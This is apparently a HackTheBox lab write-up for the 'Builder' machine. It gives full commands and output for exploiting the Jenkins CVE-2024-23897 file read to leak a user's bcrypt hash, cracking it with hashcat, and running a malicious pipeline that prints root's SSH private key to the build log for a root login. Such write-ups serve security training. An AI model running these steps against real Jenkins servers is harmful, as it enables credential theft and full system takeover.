---
title: "HTB: Builder"
date: 2026-04-11
draft: false
categories: ["writeup"]
tags:
  - hackthebox
  - linux
  - medium
  - jenkins
  - cve-2024-23897
  - arbitrary-file-read
  - hash-cracking
  - jenkins-pipeline
  - ssh-key-exfiltration
description: "Jenkins 2.441 arbitrary file read (CVE-2024-23897) leaks jennifer's bcrypt hash; cracking it gives Jenkins access, then a malicious pipeline exfiltrates root's SSH key."
summary: "Jenkins 2.441 arbitrary file read (CVE-2024-23897) leaks jennifer's bcrypt hash; cracking it gives Jenkins access, then a malicious pipeline exfiltrates root's SSH key."
cover:
  image: "/images/htb-builder/info-card.png"
  alt: "HTB Builder"
  relative: false
showToc: true
TocOpen: false
---

| Field      | Info   |
|------------|--------|
| OS         | Linux  |
| Difficulty | Medium |
| Release    | 2024   |

### Kill Chain

| Step | Action | Result |
|------|--------|--------|
| 1 | nmap | Jenkins 2.441 on TCP 8080 |
| 2 | CVE-2024-23897 via jenkins-cli.jar | Arbitrary file read unauthenticated |
| 3 | Read `/var/jenkins_home/users/users.xml` | Discovered user `jennifer` |
| 4 | Read jennifer's `config.xml` | Extracted bcrypt password hash |
| 5 | Hashcat mode 3200 | Cracked hash: `jennifer:princess` |
| 6 | Login to Jenkins as jennifer | Found SSH credential ID=1 scoped to root |
| 7 | Malicious Pipeline with `sshagent` | Exfiltrated root's SSH private key |
| 8 | SSH as root using extracted key | Root shell |

### Credentials

| User | Credential | Source |
|------|-----------|--------|
| jennifer | `princess` (bcrypt hash cracked) | `/var/jenkins_home/users/jennifer_.../config.xml` |
| root | SSH private key | Jenkins credential ID=1, exfiltrated via pipeline |

---

## Recon

### nmap

A quick full-port sweep first to see what's open.

**Kali:**
```console
$ nmap -p- --min-rate 8000 10.129.230.220

PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Only two ports. I ran a service scan against both.

**Kali:**
```console
$ nmap -p 22,8080 -sC -sV 10.129.230.220

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(10.0.18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Jenkins on 8080, nothing unusual on SSH. The version in the page footer is what matters here.

### Jenkins - TCP 8080

Browsing to the dashboard confirms Jenkins 2.441. The version is displayed in the bottom-right corner of the page.

![Jenkins 2.441 dashboard, unauthenticated](/images/htb-builder/jenkins-dashboard.png)

Jenkins 2.441 is vulnerable to CVE-2024-23897. No need to dig further before exploiting it.

---

## Shell as jennifer

### CVE-2024-23897 — Arbitrary File Read

CVE-2024-23897 is an unauthenticated arbitrary file read in Jenkins <= 2.441. The Jenkins CLI (`jenkins-cli.jar`) lets you prefix arguments with `@` to load content from a file, and due to a parsing flaw the server reads that file and returns its contents in error messages. No credentials needed.

First I grabbed the CLI jar from the target.

**Kali:**
```console
$ wget http://10.129.230.220:8080/jnlpJars/jenkins-cli.jar
```

I used `connect-node` with `@/proc/self/environ` to confirm the Jenkins home directory.

**Kali:**
```console
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' connect-node "@/proc/self/environ" 2>&1 | tr '\0' '\n' | grep HOME

JAVA_HOME=/opt/java/openjdk
HOME=/var/jenkins_home
JENKINS_HOME=/var/jenkins_home
```

Home is `/var/jenkins_home`. Next I read the users index to find any Jenkins accounts.

**Kali:**
```console
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' connect-node "@/var/jenkins_home/users/users.xml" 2>&1

<?xml version='1.1' encoding='UTF-8'?>: No such agent "..." exists.
      <string>jennifer_12108429903186576833</string>: No such agent "..." exists.
      <string>jennifer</string>: No such agent "..." exists.
...[snip]...
```

One user: `jennifer`, stored in directory `jennifer_12108429903186576833`. I read her config file to get her password hash.

**Kali:**
```console
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml" 2>&1

...[snip]...
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such agent "..." exists.
...[snip]...
```

Got the bcrypt hash.

### Cracking jennifer's Hash

Hashcat mode 3200 handles bcrypt. I stripped the `#jbcrypt:` prefix and saved the raw hash to a file.

**Kali:**
```console
$ hashcat jennifer.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -m 3200

...[snip]...
$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
...[snip]...
```

Credentials: `jennifer:princess`. I logged into the Jenkins UI.

![Jenkins login as jennifer](/images/htb-builder/jenkins-login.png)

![Jenkins dashboard authenticated as jennifer](/images/htb-builder/jenkins-dashboard-jennifer.png)

---

## Shell as root

### SSH Credential in Jenkins

Logged in as jennifer, I went to Manage Jenkins to see what was stored.

![Manage Jenkins with Credentials highlighted](/images/htb-builder/jenkins-manage-credentials.png)

The Credentials page shows a single SSH key credential, ID=1, scoped globally to "root".

![Jenkins credentials showing SSH key for root](/images/htb-builder/jenkins-credentials-ssh-key.png)

I can't view the raw key through the UI, but I can use it in a pipeline job. Before building one, I checked which plugins were available.

![Manage Jenkins with Plugins highlighted](/images/htb-builder/jenkins-manage-plugins.png)

The SSH Agent plugin is installed. That's the one that exposes the `sshagent` pipeline step, which loads a stored SSH key and uses it for an SSH connection.

![SSH Agent plugin shown as installed](/images/htb-builder/jenkins-ssh-agent-plugin.png)

### Pipeline Exfiltration

The plan: create a Pipeline job that uses `sshagent(credentials: ['1'])` to load the root SSH key, then SSH into the target and cat `/root/.ssh/id_rsa`. The key gets printed to the build log in cleartext.

I created a new item from the dashboard.

![New Item button on Jenkins dashboard](/images/htb-builder/jenkins-new-item.png)

Named the job `ssh_key` and selected Pipeline as the type.

![Creating new pipeline job named ssh_key](/images/htb-builder/jenkins-new-pipeline.png)

![Pipeline job created, Build Now button visible](/images/htb-builder/jenkins-pipeline-created.png)

Then I configured the Pipeline section with this script:

```text
pipeline {
    agent any

    stages {
        stage('SSH') {
            steps {
                script {
                    sshagent(credentials: ['1']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@10.129.230.220 "cat /root/.ssh/id_rsa"'
                    }
                }
            }
        }
    }
}
```

![Pipeline configuration with sshagent script, Save button highlighted](/images/htb-builder/jenkins-pipeline-config.png)

Saved and hit Build Now. The stage went green almost immediately.

![Pipeline build #1 succeeded](/images/htb-builder/jenkins-build-success.png)

I clicked into the build and opened Console Output.

![Build #1 details, Console Output link highlighted](/images/htb-builder/jenkins-build-console.png)

![Build started by jennifer](/images/htb-builder/jenkins-build-details.png)

The console log shows the SSH private key for root printed in full.

![Console output containing root's SSH private key](/images/htb-builder/jenkins-console-root-key.png)

I copied the key out of the log, saved it to a file, and fixed the permissions.

**Kali:**
```console
$ chmod 600 root_key
$ ssh -i root_key root@10.129.230.220
```

![Root shell on builder](/images/htb-builder/root-shell.png)

### user.txt

**Target (root):**
```console
# cat /home/jennifer/user.txt
55c42bad************************
```

![user.txt flag](/images/htb-builder/user-flag.png)

### root.txt

**Target (root):**
```console
# cat /root/root.txt
f41f2a94************************
```

![root.txt flag](/images/htb-builder/root-flag.png)
